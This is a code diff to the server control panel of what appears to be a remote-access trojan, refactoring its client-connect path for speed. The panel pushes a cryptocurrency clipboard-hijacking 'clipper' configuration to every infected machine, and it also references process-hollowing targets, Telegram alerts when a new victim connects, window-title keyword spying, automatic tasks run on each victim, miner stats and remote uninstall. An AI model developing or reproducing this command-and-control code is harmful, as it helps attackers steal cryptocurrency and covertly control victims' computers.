@@ -338,6 +338,14 @@ public partial class ServerWindow : ThemedWindow
             if (BldHosts.Items.Count == 0)
                 BldHosts.Items.Add("127.0.0.1");
             GridAutoTasks.ItemsSource = _autoTasks;
+            // Keep _autoTasksSnap current — replaced atomically so connect tasks read without Dispatcher.
+            _autoTasks.CollectionChanged += (_, _) =>
+                _autoTasksSnap = _autoTasks.Count > 0
+                    ? (System.Collections.Generic.IReadOnlyList<Data.AutoTaskEntry>)_autoTasks.ToList()
+                    : null;
+            // Volatile bool caches for Telegram checkbox — updated here + in LoadConfig.
+            BldTelegramEnabled.Checked   += (_, _) => _telegramEnabled = true;
+            BldTelegramEnabled.Unchecked += (_, _) => _telegramEnabled = false;
             InitHollowTargets();
 
             // First launch: cert + auth key setup
@@ -467,6 +475,17 @@ public partial class ServerWindow : ThemedWindow
     // ── Crypto Clipper (global — applies to all clients) ────────────────────────
     private bool _clipperRunning;
     private int  _clipperCount;
+    // Cached config JSON — set on ClipperStart so connect tasks read it lock-free.
+    private volatile string? _clipperConfigJsonCache;
+
+    // ── Volatile caches for connect-task hot path ────────────────────────────────
+    // These are written on the UI thread and read lock-free from Task.Run workers,
+    // eliminating Dispatcher.InvokeAsync round-trips during high connect rates.
+    private volatile bool    _telegramEnabled;
+    private volatile bool    _winNotifyEnabled;
+    private volatile string[]? _winNotifyKeywordsSnap;
+    // Immutable snapshot of _autoTasks — replaced atomically on CollectionChanged.
+    private volatile System.Collections.Generic.IReadOnlyList<Data.AutoTaskEntry>? _autoTasksSnap;
 
     private ClipperSetConfigData BuildClipperConfig(bool enabled) => new()
     {
@@ -488,6 +507,7 @@ public partial class ServerWindow : ThemedWindow
     private async void ClipperStart_Click(object sender, RoutedEventArgs e)
     {
         _clipperRunning = true;
+        _clipperConfigJsonCache = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(true));
         BtnClipperStart.IsEnabled = false; BtnClipperStart.Opacity = 0.45;
         BtnClipperStop.IsEnabled  = true;  BtnClipperStop.Opacity  = 1.0;
         ClipperActiveBadge.Visibility = Visibility.Visible;
@@ -497,7 +517,7 @@ public partial class ServerWindow : ThemedWindow
             var pkt = new Packet
             {
                 Type = PacketType.ClipperSetConfig,
-                Data = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(true))
+                Data = _clipperConfigJsonCache
             };
             await _server.SendToAll(pkt);
             Log($"[CLIPPER] Started — config pushed to {_server.ConnectedClients.Count} client(s).");
@@ -574,11 +594,8 @@ public partial class ServerWindow : ThemedWindow
 
     private async Task SendWindowNotifyKeywords(string clientId)
     {
-        if (_server == null) return;
-        bool enabled = await Dispatcher.InvokeAsync(() => WinNotifyEnabled.IsChecked == true);
-        if (!enabled) return;
-        var keywords = await Dispatcher.InvokeAsync(() =>
-            WinNotifyKeywordsList.Items.Cast<string>().ToArray());
+        if (_server == null || !_winNotifyEnabled) return;
+        var keywords = _winNotifyKeywordsSnap ?? Array.Empty<string>();
         await _server.SendToClient(clientId, new Packet
         {
             Type = PacketType.WindowNotifyKeywords,
@@ -631,6 +648,7 @@ public partial class ServerWindow : ThemedWindow
 
     private void PushWinNotifyKeywords()
     {
+        _winNotifyKeywordsSnap = WinNotifyKeywordsList.Items.Cast<string>().ToArray();
         if (_server == null || WinNotifyEnabled.IsChecked != true) return;
         var clients = _server.ConnectedClients.Keys.ToList();
         if (clients.Count == 0) return;
@@ -745,6 +763,7 @@ public partial class ServerWindow : ThemedWindow
         if (sender == WinNotifyEnabled)
         {
             bool enabled = WinNotifyEnabled.IsChecked == true;
+            _winNotifyEnabled = enabled;
             SetWinNotifyKeywordsLocked(enabled);
             if (_server != null)
             {
@@ -1003,21 +1022,19 @@ public partial class ServerWindow : ThemedWindow
                                          || rec.ActivityLog.Count <= 1;
                         NotificationService.NotifyConnected(c.Id, isNewHwid);
 
-                        var atSnapshot = await Dispatcher.InvokeAsync(
-                            () => _autoTasks.Count > 0 ? _autoTasks.ToList() : null);
+                        var atSnapshot = _autoTasksSnap;
                         if (atSnapshot != null)
                             await ExecuteAutoTasksForClient(c, atSnapshot);
 
-                        bool telegramEnabled = await Dispatcher.InvokeAsync(() => BldTelegramEnabled.IsChecked == true);
-                        if (isNewHwid && telegramEnabled)
+                        if (isNewHwid && _telegramEnabled)
                             _ = ServerTelegramNotifyAsync(c);
 
-                        if (_clipperRunning && _server != null)
+                        var cachedClipperJson = _clipperConfigJsonCache;
+                        if (_clipperRunning && _server != null && cachedClipperJson != null)
                             await _server.SendToClient(c.Id, new Packet
                             {
                                 Type = PacketType.ClipperSetConfig,
-                                Data = Newtonsoft.Json.JsonConvert.SerializeObject(
-                                    await Dispatcher.InvokeAsync(() => BuildClipperConfig(true)))
+                                Data = cachedClipperJson
                             });
 
                         await SendWindowNotifyKeywords(c.Id);
@@ -2377,6 +2394,11 @@ public partial class ServerWindow : ThemedWindow
             Log($"[ADMIN] Uninstall sent to {c.Username}@{c.IP} ({c.Id}).");
         }));
 
+        // Force-disconnect immediately so the client disappears from the panel right away
+        // without waiting for the TCP close from the client side (same behaviour as Dark Worm).
+        // PendingUninstall=true suppresses the error log in the ReadLoop finally block.
+        foreach (var c in clients) _server?.DisconnectClient(c.Id);
+
         SetStatus($"Uninstall sent to {clients.Count} client(s).");
     }
 
@@ -2848,6 +2870,10 @@ public partial class ServerWindow : ThemedWindow
             if (cfg.TryGetValue("WnTelegramChatId1", out var wc1)) WnTelegramChatId1.Text = wc1;
             if (cfg.TryGetValue("WnTelegramChatId2", out var wc2)) WnTelegramChatId2.Text = wc2;
             SetWinNotifyKeywordsLocked(WinNotifyEnabled.IsChecked == true);
+            // Sync volatile caches after config is applied.
+            _telegramEnabled        = BldTelegramEnabled.IsChecked == true;
+            _winNotifyEnabled       = WinNotifyEnabled.IsChecked == true;
+            _winNotifyKeywordsSnap  = WinNotifyKeywordsList.Items.Cast<string>().ToArray();
             if (cfg.TryGetValue("MnrStatsToken", out var mst) && !string.IsNullOrEmpty(mst)) _mnrStatsToken = mst;
             if (cfg.TryGetValue("MnrStatsPort",  out var msp) && !string.IsNullOrEmpty(msp) && TxtMnrStatsPort != null) TxtMnrStatsPort.Text = msp;
 
@@ -5076,8 +5102,8 @@ Read-Host 'Press Enter to close'
         if (TxtLogs == null) return; // called before XAML init completes
         _logLineCount++;
 
-        // Mirror to diagnostic file (never blocks UI — fire and forget)
-        _ = Task.Run(() => DiagnosticLogger.Info(msg));
+        // Mirror to diagnostic file — queue-based, zero lock contention on hot paths.
+        DiagnosticLogger.Enqueue(msg);
 
         if (_logLineCount > LogMaxLines)
         {
